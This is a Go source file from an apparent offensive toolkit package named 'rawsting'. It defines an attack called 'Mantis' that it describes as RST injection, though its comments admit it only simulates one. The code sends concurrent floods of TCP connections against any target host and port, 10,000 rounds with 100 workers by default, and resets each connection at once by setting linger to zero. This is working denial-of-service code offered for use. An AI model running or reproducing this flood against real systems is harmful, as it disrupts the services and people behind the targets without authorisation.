// Package rawsting provides raw socket attack vectors.
package rawsting

import (
	"context"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// Mantis implements a RST injection attack.
// Severs connections with precision RST cuts.
// WARNING: Requires administrator/root privileges for true raw socket access.
type Mantis struct{}

// NewMantis creates a new Mantis RST injection instance.
func NewMantis() *Mantis {
	return &Mantis{}
}

// Name returns the attack name.
func (m *Mantis) Name() string {
	return "Mantis"
}

// Description returns a brief description.
func (m *Mantis) Description() string {
	return "Mantis RST injection - severs connections with precision cuts (requires admin)"
}

// Attack executes the RST flood attack.
// Note: This is a simplified implementation. True RST injection requires
// raw sockets and the ability to craft TCP packets with RST flag set.
func (m *Mantis) Attack(ctx context.Context, target string, opts AttackOpts) (*Result, error) {
	if opts.Concurrency <= 0 {
		opts.Concurrency = 100
	}
	if opts.Rounds <= 0 {
		opts.Rounds = 10000
	}
	if opts.Port <= 0 {
		opts.Port = 80
	}

	var (
		successful atomic.Int64
		failed     atomic.Int64
		completed  atomic.Int64
	)

	start := time.Now()
	addr := fmt.Sprintf("%s:%d", target, opts.Port)

	jobs := make(chan int, opts.Rounds)
	var wg sync.WaitGroup

	for i := 0; i < opts.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case _, ok := <-jobs:
					if !ok {
						return
					}
					// Simulates RST behavior by rapidly connecting and resetting
					if m.sendRST(ctx, addr) {
						successful.Add(1)
					} else {
						failed.Add(1)
					}
					current := completed.Add(1)

					if opts.Verbose && current%500 == 0 {
						fmt.Printf("\r   Progress: %d/%d RST packets", current, opts.Rounds)
					}
				}
			}
		}()
	}

	for i := 0; i < opts.Rounds; i++ {
		select {
		case <-ctx.Done():
			break
		case jobs <- i:
		}
	}
	close(jobs)

	wg.Wait()

	if opts.Verbose {
		fmt.Println()
	}

	return &Result{
		TotalPackets: int(completed.Load()),
		Successful:   int(successful.Load()),
		Failed:       int(failed.Load()),
		Duration:     time.Since(start),
	}, nil
}

// sendRST simulates RST injection by creating connections and forcing abrupt closure.
// A real RST injection would craft raw TCP packets with RST flag.
func (m *Mantis) sendRST(ctx context.Context, addr string) bool {
	dialer := net.Dialer{
		Timeout: 100 * time.Millisecond,
	}

	conn, err := dialer.DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}

	// Set SO_LINGER to 0 to force RST on close
	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetLinger(0)
	}

	conn.Close()
	return true
}
